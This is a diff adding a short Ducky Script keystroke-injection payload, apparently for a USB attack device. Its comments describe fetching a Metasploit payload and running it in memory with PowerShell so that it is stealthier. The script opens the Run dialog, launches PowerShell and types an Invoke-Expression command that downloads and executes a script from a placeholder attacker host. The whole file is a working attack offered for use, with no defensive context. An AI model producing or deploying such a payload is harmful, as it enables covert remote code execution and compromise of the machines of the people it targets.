@@ -1,0 +1,9 @@
+REM Pulls a metasploit payload and executes it in memory using powershell
+REM This doesn't save to disk, which can make it stealthier
+DEFAULT_DELAY 500
+GUI r
+STRING powershell
+ENTER
+DELAY 1000
+STRING Invoke-Expression (New-Object Net.WebClient).DownloadString(“http://attacker_url/script.ps1”)
+ENTER
